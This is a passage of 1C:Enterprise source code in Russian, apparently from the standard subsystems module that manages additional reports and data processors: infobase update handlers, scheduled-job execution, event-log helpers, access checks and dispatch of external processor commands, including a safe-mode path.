	|		ИНАЧЕ ЛОЖЬ
	|	КОНЕЦ КАК ТребуетсяЗаполнитьИмяОбъекта
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДопОтчеты
	|ГДЕ
	|	ДопОтчеты.ЭтоГруппа = ЛОЖЬ
	|	И НЕ ДопОтчеты.ХранилищеОбработки ЕСТЬ NULL "";
	
	ВидыДопОтчетов = Новый Массив;
	ВидыДопОтчетов.Добавить(Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет);
	ВидыДопОтчетов.Добавить(Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет);
	
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""ВидыДопОтчетов"", ВидыДопОтчетов);
	Запрос.Текст = ТекстЗапроса;
	
	ВсеДопОтчеты = Запрос.Выполнить().Выгрузить();
	
	ПоискДублей = Новый Структура(""ИмяОбъекта, ЭтоОтчет, Публикуется"");
	ПоискДублей.Публикуется = Истина;
	
	// Дополнительные отчеты и обработки, для которых необходимо заполнить имя объекта.
	ДопОтчетыДляЗаполнения = ВсеДопОтчеты.НайтиСтроки(Новый Структура(""ТребуетсяЗаполнитьИмяОбъекта"", Истина));
	Для Каждого СтрокаТаблицы Из ДопОтчетыДляЗаполнения Цикл
		
		// Помещение двоичных данных отчета (обработки) во временное хранилище.
		АдресВоВременномХранилище = ПоместитьВоВременноеХранилище(СтрокаТаблицы.ХранилищеОбработки.Получить());
		
		// Определение менеджера
		Менеджер = ?(СтрокаТаблицы.ЭтоОтчет, ВнешниеОтчеты, ВнешниеОбработки);
		
		// Получение экземпляра объекта.
		Объект = СтрокаТаблицы.Ссылка.ПолучитьОбъект();
		
		// Установка имени объекта
		Если ОбщегоНазначения.ЕстьЗащитаОтОпасныхДействий() Тогда
			Объект.ИмяОбъекта = СокрЛП(Менеджер.Подключить(АдресВоВременномХранилище, , Истина,
				ОбщегоНазначения.ОписаниеЗащитыБезПредупреждений()));
		Иначе
			Объект.ИмяОбъекта = СокрЛП(Менеджер.Подключить(АдресВоВременномХранилище, , Истина));
		КонецЕсли;
		
		// Если имя отчета (обработки) уже используется другим опубликованным отчетом (обработкой),
		// то данный объект является дублем - необходимо сменить его вариант публикации на режим отладки (или отключить).
		Если СтрокаТаблицы.Публикуется Тогда
			ПоискДублей.ИмяОбъекта = Объект.ИмяОбъекта;
			ПоискДублей.ЭтоОтчет   = СтрокаТаблицы.ЭтоОтчет;
			Если ВсеДопОтчеты.НайтиСтроки(ПоискДублей).Количество() > 0 Тогда
				ОтключитьКонфликтующую(Объект);
			КонецЕсли;
		КонецЕсли;
		
		// Регистрация использованного имени объекта в таблице для контроля дублей.
		СтрокаТаблицы.ИмяОбъекта = Объект.ИмяОбъекта;
		
		// Запись объекта
		ОбновлениеИнформационнойБазы.ЗаписатьДанные(Объект);
		
	КонецЦикла;
	
КонецПроцедуры

// [2.1.3.2] Замена имен объектов назначения на ссылки справочника ИдентификаторыОбъектовМетаданных.
Процедура ЗаменитьИменаОбъектовМетаданныхНаСсылки() Экспорт
	
	ТекстЗапроса =
	""ВЫБРАТЬ
	|	ТаблицаНазначение.Ссылка КАК СправочникСсылка,
	|	ТаблицаНазначение.НомерСтроки КАК НомерСтроки,
	|	СправочникИОМ.Ссылка КАК ОбъектНазначения
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки.Назначение КАК ТаблицаНазначение
	|		ЛЕВОЕ СОЕДИНЕНИЕ Справочник.ИдентификаторыОбъектовМетаданных КАК СправочникИОМ
	|		ПО ТаблицаНазначение.УдалитьПолноеИмяОбъектаМетаданных = СправочникИОМ.ПолноеИмя
	|ИТОГИ ПО
	|	СправочникСсылка"";
	
	Запрос = Новый Запрос;
	Запрос.Текст = ТекстЗапроса;
	
	ВыборкаСсылок = Запрос.Выполнить().Выбрать(ОбходРезультатаЗапроса.ПоГруппировкам);
	Пока ВыборкаСсылок.Следующий() Цикл
		СправочникОбъект = ВыборкаСсылок.СправочникСсылка.ПолучитьОбъект();
		МассивСтрокДляУдаления = Новый Массив;
		ВыборкаСтрок = ВыборкаСсылок.Выбрать();
		Пока ВыборкаСтрок.Следующий() Цикл
			СтрокаТабличнойЧасти = СправочникОбъект.Назначение.Получить(ВыборкаСтрок.НомерСтроки - 1);
			СтрокаТабличнойЧасти.ОбъектНазначения = ВыборкаСтрок.ОбъектНазначения;
			Если ЗначениеЗаполнено(СтрокаТабличнойЧасти.ОбъектНазначения) Тогда
				СтрокаТабличнойЧасти.УдалитьПолноеИмяОбъектаМетаданных = """";
			Иначе
				МассивСтрокДляУдаления.Добавить(СтрокаТабличнойЧасти);
			КонецЕсли;
		КонецЦикла;
		Для Каждого СтрокаТабличнойЧасти Из МассивСтрокДляУдаления Цикл
			СправочникОбъект.Назначение.Удалить(СтрокаТабличнойЧасти);
		КонецЦикла;
		ОбновлениеИнформационнойБазы.ЗаписатьДанные(СправочникОбъект);
	КонецЦикла;
	
	РегистрыСведений.НазначениеДополнительныхОбработок.Обновить(Истина);
	
КонецПроцедуры

// [2.1.3.22] Включение функциональной опции ИспользоватьДополнительныеОтчетыИОбработки для локального режима.
Процедура ВключитьФункциональнуюОпцию() Экспорт
	
	Если ОбщегоНазначения.РазделениеВключено() Тогда
		Возврат;
	КонецЕсли;
	
	Константы.ИспользоватьДополнительныеОтчетыИОбработки.Установить(Истина);
	
КонецПроцедуры

// [2.2.2.25] Заполнение реквизита РежимСовместимостиРазрешений для справочника ДополнительныеОтчетыИОбработки.
Процедура ЗаполнитьРежимСовместимостиРазрешений() Экспорт
	
	НачатьТранзакцию();
	
	Попытка
		
		Блокировка = Новый БлокировкаДанных();
		Блокировка.Добавить(""Справочник.ДополнительныеОтчетыИОбработки"");
		Блокировка.Заблокировать();
		
		Выборка = Справочники.ДополнительныеОтчетыИОбработки.Выбрать();
		Пока Выборка.Следующий() Цикл
			
			Если Не Выборка.ЭтоГруппа И Не ЗначениеЗаполнено(Выборка.РежимСовместимостиРазрешений) Тогда
				
				ЗаблокироватьДанныеДляРедактирования(Выборка.Ссылка);
				
				Объект = Выборка.ПолучитьОбъект();
				
				Попытка
					
					ОбъектОбработки = ОбъектВнешнейОбработки(Выборка.Ссылка);
					РегистрационныеДанные = ОбъектОбработки.СведенияОВнешнейОбработке();
					
					Если РегистрационныеДанные.Свойство(""ВерсияБСП"") Тогда
						Если ОбщегоНазначенияКлиентСервер.СравнитьВерсии(РегистрационныеДанные.ВерсияБСП, ""2.2.2.0"") > 0 Тогда
							РежимСовместимости = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_2_2;
						Иначе
							РежимСовместимости = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_1_3;
						КонецЕсли;
					Иначе
						РежимСовместимости = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_1_3;
					КонецЕсли;
					
					Публикация = Объект.Публикация;
					
				Исключение
					
					// При невозможности подключения обработки - установим для нее режим совместимости
					// разрешений с версией БСП 2.1.3 и временно заблокируем.
					ТекстОшибки = """""""" + Объект.Наименование + """""":""
						+ Символы.ПС + НСтр(""ru = 'Не удалось определить режим совместимости разрешений по причине:'"")
						+ Символы.ПС + ПодробноеПредставлениеОшибки(ИнформацияОбОшибке())
						+ Символы.ПС
						+ Символы.ПС + НСтр(""ru = 'Объект заблокирован в режиме совместимости с версией 2.1.3.'"");
					ЗаписатьПредупреждение(Объект.Ссылка, ТекстОшибки);
					РежимСовместимости = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_1_3;
					Публикация = Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Отключена;
					
				КонецПопытки;
				
				Объект.РежимСовместимостиРазрешений = РежимСовместимости;
				Объект.Публикация = Публикация;
				ОбновлениеИнформационнойБазы.ЗаписатьДанные(Объект);
				
			КонецЕсли;
			
		КонецЦикла;
		
		ЗафиксироватьТранзакцию();
		
	Исключение
		
		ОтменитьТранзакцию();
		ВызватьИсключение;
		
	КонецПопытки;
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Регламентные задания

// Обработчик экземпляра регламентного задания ЗапускОбработок.
//   Запускает обработчик глобальной обработки по регламентному заданию,
//   с указанным идентификатором команды.
//
// Параметры:
//   ВнешняяОбработка     - СправочникСсылка.ДополнительныеОтчетыИОбработки - Ссылка выполняемой обработки.
//   ИдентификаторКоманды - Строка - Идентификатор выполняемой команды.
//
Процедура ВыполнитьОбработкуПоРегламентномуЗаданию(ВнешняяОбработка, ИдентификаторКоманды) Экспорт
	
	ОбщегоНазначения.ПриНачалеВыполненияРегламентногоЗадания(Метаданные.РегламентныеЗадания.ЗапускДополнительныхОбработок);
	
	// Запись журнала регистрации
	ЗаписатьИнформацию(ВнешняяОбработка, НСтр(""ru = 'Команда %1: Запуск.'""), ИдентификаторКоманды);
	
	// Выполнение команды
	Попытка
		ВыполнитьКоманду(Новый Структура(""ДополнительнаяОбработкаСсылка, ИдентификаторКоманды"", ВнешняяОбработка, ИдентификаторКоманды), Неопределено);
	Исключение
		ЗаписатьОшибку(
			ВнешняяОбработка,
			НСтр(""ru = 'Команда %1: Ошибка выполнения:%2'""),
			ИдентификаторКоманды,
			Символы.ПС + ПодробноеПредставлениеОшибки(ИнформацияОбОшибке()));
	КонецПопытки;
	
	// Запись журнала регистрации
	ЗаписатьИнформацию(ВнешняяОбработка, НСтр(""ru = 'Команда %1: Завершение.'""), ИдентификаторКоманды);
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Экспортные служебные процедуры и функции.

// Возвращает Истина если вид относится к категории глобальных дополнительных отчетов или обработок.
//
// Параметры:
//   Вид - ПеречислениеСсылка.ВидыДополнительныхОтчетовИОбработок - Вид внешней обработки.
//
// Возвращаемое значение: 
//    Истина - обработка относится к категории глобальных.
//    Ложь   - обработка относится к категории назначаемых.
//
Функция ПроверитьГлобальнаяОбработка(Вид) Экспорт
	
	Возврат Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка
		Или Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет;
	
КонецФункции

// Преобразует вид дополнительных отчетов или обработок из строковой константы в ссылку перечисления.
//
// Параметры:
//   СтроковоеПредставление - Строка - Строковое представление вида.
//
// Возвращаемое значение: 
//   ПеречислениеСсылка.ВидыДополнительныхОтчетовИОбработок - Ссылка вида.
//
Функция ПолучитьВидОбработкиПоСтроковомуПредставлениюВида(СтроковоеПредставление) Экспорт
	
	Если СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиЗаполнениеОбъекта() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиОтчет() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиПечатнаяФорма() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиСозданиеСвязанныхОбъектов() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.СозданиеСвязанныхОбъектов;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиШаблонСообщения() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.ШаблонСообщения;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительнаяОбработка() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка;
	ИначеЕсли СтроковоеПредставление = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительныйОтчет() Тогда
		Возврат Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет;
	КонецЕсли;
	
КонецФункции

// Преобразует вид дополнительных отчетов или обработок из ссылки перечисления в строковую константу.
Функция ВидВСтроку(СсылкаВида) Экспорт
	
	Если СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиЗаполнениеОбъекта();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиОтчет();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиПечатнаяФорма();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.СозданиеСвязанныхОбъектов Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиСозданиеСвязанныхОбъектов();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.ШаблонСообщения Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиШаблонСообщения();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительнаяОбработка();
		
	ИначеЕсли СсылкаВида = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		Возврат ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительныйОтчет();
		
	Иначе
		Возврат """";
	КонецЕсли;
	
КонецФункции

// Возвращает имя рабочего места команды.
Функция ПредставлениеРаздела(Раздел) Экспорт
	Если Раздел = ДополнительныеОтчетыИОбработкиКлиентСервер.ИдентификаторРабочегоСтола()
		Или Раздел = Справочники.ИдентификаторыОбъектовМетаданных.ПустаяСсылка() Тогда
		Возврат НСтр(""ru = 'Начальная страница'"");
	Иначе
		Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Раздел """"%1""""'""),
			ПредставлениеОбъектаМетаданных(Раздел));
	КонецЕсли;
КонецФункции

// Возвращает имя рабочего места команды.
Функция ПредставлениеОбъектаМетаданных(Объект) Экспорт
	Если ТипЗнч(Объект) = Тип(""СправочникСсылка.ИдентификаторыОбъектовМетаданных"") Тогда
		ОбъектМетаданных = ОбщегоНазначения.ОбъектМетаданныхПоИдентификатору(Объект);
	ИначеЕсли ТипЗнч(Объект) = Тип(""ОбъектМетаданных"") Тогда
		ОбъектМетаданных = Объект;
	Иначе
		ОбъектМетаданных = Метаданные.Подсистемы.Найти(Объект);
	КонецЕсли;
	Возврат ОбъектМетаданных.Представление();
КонецФункции

// Проверяет наличие права добавления дополнительных отчетов и обработок.
Функция ПравоДобавления(Знач ДополнительнаяОбработка = Неопределено) Экспорт
	
	Результат = Ложь;
	СтандартнаяОбработка = Истина;
	
	ИнтеграцияСТехнологиейСервиса.ПриПроверкеПраваДобавления(ДополнительнаяОбработка, Результат, СтандартнаяОбработка);
	
	Если СтандартнаяОбработка Тогда
		
		Если ОбщегоНазначения.РазделениеВключено()
		   И ОбщегоНазначения.ДоступноИспользованиеРазделенныхДанных() Тогда
			
			Результат = Пользователи.ЭтоПолноправныйПользователь(, Истина);
		Иначе
			Результат = ПравоДоступа(""Изменение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки);
		КонецЕсли;
		
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции

// Проверяет возможность выгрузки дополнительного отчета или обработки из программы в файл.
//
// Параметры:
//   Обработка - СправочникСсылка.ДополнительныеОтчетыИОбработки.
//
// Возвращаемое значение:
//   Булево
//
Функция ВозможнаВыгрузкаОбработкиВФайл(Знач Обработка) Экспорт
	
	Результат = Ложь;
	СтандартнаяОбработка = Истина;
	
	ИнтеграцияСТехнологиейСервиса.ПриПроверкеВозможностиВыгрузкиОбработкиВФайл(Обработка, Результат, СтандартнаяОбработка);
	Если Не СтандартнаяОбработка Тогда
		Возврат Результат;
	КонецЕсли;
		
	Возврат Истина;
	
КонецФункции

// Проверяет возможность загрузки уже существующей в ИБ дополнительной обработки из файла.
//
// Параметры:
//   Обработка - СправочникСсылка.ДополнительныеОтчетыИОбработки.
//
// Возвращаемое значение:
//   Булево
//
Функция ВозможнаЗагрузкаОбработкиИзФайла(Знач Обработка) Экспорт
	
	Результат = Ложь;
	СтандартнаяОбработка = Истина;
	ИнтеграцияСТехнологиейСервиса.ПриПроверкеВозможностиЗагрузкиОбработкиИзФайла(Обработка, Результат, СтандартнаяОбработка);
		
	Если Не СтандартнаяОбработка Тогда
		Возврат Результат;
	КонецЕсли;
		
	Возврат Истина;
	
КонецФункции

// Возвращает флажок отображения пользователю расширенной информации о дополнительном отчете или обработке.
//
// Параметры:
//   Обработка - СправочникСсылка.ДополнительныеОтчетыИОбработки.
//
// Возвращаемое значение:
//   Булево
//
Функция ОтображатьРасширеннуюИнформацию(Знач Обработка) Экспорт
	
	Возврат Истина;
	
КонецФункции

// Виды публикации, недоступные для использования в текущем режиме работы программы.
Функция НедоступныеВидыПубликации() Экспорт
	
	Результат = Новый Массив;
	ИнтеграцияСТехнологиейСервиса.ПриЗаполненииНедоступныхВидовПубликации(Результат);
	Возврат Результат;
	
КонецФункции

// Процедура должна вызываться из события ПередЗаписью справочника.
//  ДополнительныеОтчетыИОбработки, выполняет проверку правомерности изменения реквизитов
//  элементов данного справочника для дополнительных обработок, полученных из
//  каталога дополнительных обработок менеджера сервиса.
//
// Параметры:
//   Источник - СправочникОбъект.ДополнительныеОтчетыИОбработки
//   Отказ - булево, флаг отказа от выполнения записи элемента справочника.
//
Процедура ПередЗаписьюДополнительнойОбработки(Источник, Отказ) Экспорт
	
	ИнтеграцияСТехнологиейСервиса.ПередЗаписьюДополнительнойОбработки(Источник, Отказ);
	
КонецПроцедуры

// Процедура должна вызываться из события ПередУдалением справочника.
//  ДополнительныеОтчетыИОбработки.
//
// Параметры:
//  Источник - СправочникОбъект.ДополнительныеОтчетыИОбработки,
//  Отказ - булево, флаг отказа от выполнения удаления элемента справочника из информационной базы.
//
Процедура ПередУдалениемДополнительнойОбработки(Источник, Отказ) Экспорт
	
	ИнтеграцияСТехнологиейСервиса.ПередУдалениемДополнительнойОбработки(Источник, Отказ);
	
КонецПроцедуры

// Определяет, используется ли в текущем сеансе фильтр подключенных дополнительных отчетов и обработок 
// для модели сервиса.
Функция ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса() Экспорт
	Возврат ОбщегоНазначения.РазделениеВключено()
		И ОбщегоНазначения.ПодсистемаСуществует(""ТехнологияСервиса.РаботаВМоделиСервиса.ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
КонецФункции

// Вызывается при создании запроса для получения таблицы команд дополнительных отчетов или обработок.
Функция АдаптироватьЗапросПоДоступнымКомандамКМоделиСервиса(Запрос)
	ИмяРегистра = ""ИспользованиеПоставляемыхДополнительныхОтчетовИОбработокВОбластяхДанных"";
	Запрос.Текст = Запрос.Текст + "";
	|
	|////////////////////////////////////////////////////////////////////////////////
	|ВЫБРАТЬ РАЗРЕШЕННЫЕ
	|	ИтоговаяТаблица.Ссылка,
	|	ИтоговаяТаблица.Идентификатор,
	|	ИтоговаяТаблица.ЗаменяемыеКоманды,
	|	ИтоговаяТаблица.ВариантЗапуска,
	|	ИтоговаяТаблица.Представление КАК Представление,
	|	ИтоговаяТаблица.ПоказыватьОповещение,
	|	ИтоговаяТаблица.Модификатор,
	|	ИтоговаяТаблица.Использование
	|ИЗ
	|	ИтоговаяТаблица КАК ИтоговаяТаблица
	|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ &ПолноИмяРегистра КАК Инсталляции
	|		ПО ИтоговаяТаблица.Ссылка = Инсталляции.ИспользуемаяОбработка
	|
	|УПОРЯДОЧИТЬ ПО
	|	Представление"";
	Запрос.Текст = СтрЗаменить(Запрос.Текст, ""&ПолноИмяРегистра"", ""РегистрСведений."" + ИмяРегистра);
	Возврат Истина;
КонецФункции

// Запись ошибки в журнал регистрации по дополнительному отчету или обработке.
Процедура ЗаписатьОшибку(Ссылка, ТекстСообщения, Реквизит1 = Неопределено, Реквизит2 = Неопределено, Реквизит3 = Неопределено) Экспорт
	Уровень = УровеньЖурналаРегистрации.Ошибка;
	ЗаписатьВЖурнал(Уровень, Ссылка, ТекстСообщения, Реквизит1, Реквизит2, Реквизит3);
КонецПроцедуры

// Запись предупреждения в журнал регистрации по дополнительному отчету или обработке.
Процедура ЗаписатьПредупреждение(Ссылка, ТекстСообщения, Реквизит1 = Неопределено, Реквизит2 = Неопределено, Реквизит3 = Неопределено)
	Уровень = УровеньЖурналаРегистрации.Предупреждение;
	ЗаписатьВЖурнал(Уровень, Ссылка, ТекстСообщения, Реквизит1, Реквизит2, Реквизит3);
КонецПроцедуры

// Запись информации в журнал регистрации по дополнительному отчету или обработке.
Процедура ЗаписатьИнформацию(Ссылка, ТекстСообщения, Реквизит1 = Неопределено, Реквизит2 = Неопределено, Реквизит3 = Неопределено)
	Уровень = УровеньЖурналаРегистрации.Информация;
	ЗаписатьВЖурнал(Уровень, Ссылка, ТекстСообщения, Реквизит1, Реквизит2, Реквизит3);
КонецПроцедуры

// Запись примечания в журнал регистрации по дополнительному отчету или обработке.
Процедура ЗаписатьПримечание(Ссылка, ТекстСообщения, Реквизит1 = Неопределено, Реквизит2 = Неопределено, Реквизит3 = Неопределено)
	Уровень = УровеньЖурналаРегистрации.Примечание;
	ЗаписатьВЖурнал(Уровень, Ссылка, ТекстСообщения, Реквизит1, Реквизит2, Реквизит3);
КонецПроцедуры

// Запись события в журнал регистрации по дополнительному отчету или обработке.
Процедура ЗаписатьВЖурнал(Уровень, Ссылка, Текст, Параметр1, Параметр2, Параметр3)
	Текст = СтрЗаменить(Текст, ""%1"", Параметр1); // Переход на СтрШаблон невозможен.
	Текст = СтрЗаменить(Текст, ""%2"", Параметр2);
	Текст = СтрЗаменить(Текст, ""%3"", Параметр3);
	ЗаписьЖурналаРегистрации(
		ДополнительныеОтчетыИОбработкиКлиентСервер.НаименованиеПодсистемы(Ложь),
		Уровень,
		Метаданные.Справочники.ДополнительныеОтчетыИОбработки,
		Ссылка,
		Текст);
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Локальные служебные процедуры и функции.

// Для внутреннего использования.
Функция ПользователиСДоступомКДополнительнымОбработкам()
	
	Результат = Новый Массив;
	
	ПроверяемыеРоли = ""ЧтениеДополнительныхОтчетовИОбработок, ДобавлениеИзменениеДополнительныхОтчетовИОбработок"";
	
	Запрос = Новый Запрос(""ВЫБРАТЬ Ссылка ИЗ Справочник.Пользователи"");
	ВсеПользователи = Запрос.Выполнить().Выгрузить().ВыгрузитьКолонку(""Ссылка"");
	
	Для Каждого Пользователь Из ВсеПользователи Цикл
		Если Пользователи.РолиДоступны(ПроверяемыеРоли, Пользователь, Ложь) Тогда
			Результат.Добавить(Пользователь);
		КонецЕсли;
	КонецЦикла;
	
	ТекстЗапроса =
	""ВЫБРАТЬ РАЗЛИЧНЫЕ
	|	НастройкиДоступа.Пользователь
	|ИЗ
	|	РегистрСведений.ПользовательскиеНастройкиДоступаКОбработкам КАК НастройкиДоступа
	|ГДЕ
	|	НЕ НастройкиДоступа.Пользователь В (&УжеДобавленныеПользователи)"";
	
	Запрос = Новый Запрос(ТекстЗапроса);
	Запрос.Параметры.Вставить(""УжеДобавленныеПользователи"", Результат);
	ПользователиВРегистре = Запрос.Выполнить().Выгрузить().ВыгрузитьКолонку(""Пользователь"");
	
	Для Каждого Пользователь Из ПользователиВРегистре Цикл
		Результат.Добавить(Пользователь);
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции

// Для внутреннего использования.
Процедура ВыполнитьКомандуДополнительногоОтчетаИлиОбработки(ВнешнийОбъект, Знач ИдентификаторКоманды, ПараметрыКоманды, Знач СценарийВБезопасномРежиме = Ложь)
	
	Если СценарийВБезопасномРежиме Тогда
		
		ВыполнитьСценарийВБезопасномРежиме(ВнешнийОбъект, ПараметрыКоманды);
		
	Иначе
		
		Если ПараметрыКоманды = Неопределено Тогда
			
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды);
			
		Иначе
			
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды, ПараметрыКоманды);
			
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры

// Для внутреннего использования.
Процедура ВыполнитьНазначаемуюКомандуДополнительногоОтчетаИлиОбработки(ВнешнийОбъект, Знач ИдентификаторКоманды, ПараметрыКоманды, ОбъектыНазначения, Знач СценарийВБезопасномРежиме = Ложь)
	
	Если СценарийВБезопасномРежиме Тогда
		
		ВыполнитьСценарийВБезопасномРежиме(ВнешнийОбъект, ПараметрыКоманды, ОбъектыНазначения);
		
	Иначе
		
		Если ПараметрыКоманды = Неопределено Тогда
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения);
		Иначе
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения, ПараметрыКоманды);
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры

// Для внутреннего использования.
Процедура ВыполнитьКомандуСозданияСвязанныхОбъектов(ВнешнийОбъект, Знач ИдентификаторКоманды, ПараметрыКоманды, ОбъектыНазначения, ИзмененныеОбъекты, Знач СценарийВБезопасномРежиме = Ложь)
	
	Если СценарийВБезопасномРежиме Тогда
		
		ПараметрыКоманды.Вставить(""ИзмененныеОбъекты"", ИзмененныеОбъекты);
		
		ВыполнитьСценарийВБезопасномРежиме(ВнешнийОбъект, ПараметрыКоманды, ОбъектыНазначения);
		
	Иначе
		
		Если ПараметрыКоманды = Неопределено Тогда
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения, ИзмененныеОбъекты);
		Иначе
			ВнешнийОбъект.ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения, ИзмененныеОбъекты, ПараметрыКоманды);
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры

// Для внутреннего использования.
Процедура ВыполнитьКомандуФормированияПечатнойФормы(ВнешнийОбъект, Знач ИдентификаторКоманды, ПараметрыКоманды, ОбъектыНазначения, Знач СценарийВБезопасномРежиме = Ложь)
	
	Если СценарийВБезопасномРежиме Тогда
		
		ВыполнитьСценарийВБезопасномРежиме(ВнешнийОбъект, ПараметрыКоманды, ОбъектыНазначения);
		
	Иначе
		
		Если ПараметрыКоманды = Неопределено Тогда
			ВнешнийОбъект.Печать(ИдентификаторКоманды, ОбъектыНазначения);
		Иначе
			ВнешнийОбъект.Печать(ИдентификаторКоманды, ОбъектыНазначения, ПараметрыКоманды);
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры

// Выполняет команду дополнительного отчета или обработки из объекта.
Функция ВыполнитьКомандуВнешнегоОбъекта(ВнешнийОбъект, ИдентификаторКоманды, ПараметрыКоманды, АдресРезультата)
	
	СведенияОВнешнемОбъекте = ВнешнийОбъект.СведенияОВнешнейОбработке();
	
	ВидОбработки = ПолучитьВидОбработкиПоСтроковомуПредставлениюВида(СведенияОВнешнемОбъекте.Вид);
	
	ПередаватьПараметры = (
		СведенияОВнешнемОбъекте.Свойство(""ВерсияБСП"")
		И ОбщегоНазначенияКлиентСервер.СравнитьВерсии(СведенияОВнешнемОбъекте.ВерсияБСП, ""1.2.1.4"") >= 0);
	
	РезультатВыполнения = ОбщегоНазначенияКлиентСервер.СвойствоСтруктуры(ПараметрыКоманды, ""РезультатВыполнения"");
	Если ТипЗнч(РезультатВыполнения) <> Тип(""Структура"") Тогда
		ПараметрыКоманды.Вставить(""РезультатВыполнения"", Новый Структура());
	КонецЕсли;
	
	ОписаниеКоманды = СведенияОВнешнемОбъекте.Команды.Найти(ИдентификаторКоманды, ""Идентификатор"");
	Если ОписаниеКоманды = Неопределено Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'Команда %1 не обнаружена.'""), ИдентификаторКоманды);
	КонецЕсли;
	
	ЭтоСценарийВБезопасномРежиме = (ОписаниеКоманды.Использование = ""СценарийВБезопасномРежиме"");
	
	ИзмененныеОбъекты = Неопределено;
	
	Если ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка
		ИЛИ ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		
		ВыполнитьКомандуДополнительногоОтчетаИлиОбработки(
			ВнешнийОбъект,
			ИдентификаторКоманды,
			?(ПередаватьПараметры, ПараметрыКоманды, Неопределено),
			ЭтоСценарийВБезопасномРежиме);
		
	ИначеЕсли ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.СозданиеСвязанныхОбъектов Тогда
		
		ИзмененныеОбъекты = Новый Массив;
		ВыполнитьКомандуСозданияСвязанныхОбъектов(
			ВнешнийОбъект,
			ИдентификаторКоманды,
			?(ПередаватьПараметры, ПараметрыКоманды, Неопределено),
			ПараметрыКоманды.ОбъектыНазначения,
			ИзмененныеОбъекты,
			ЭтоСценарийВБезопасномРежиме);
		
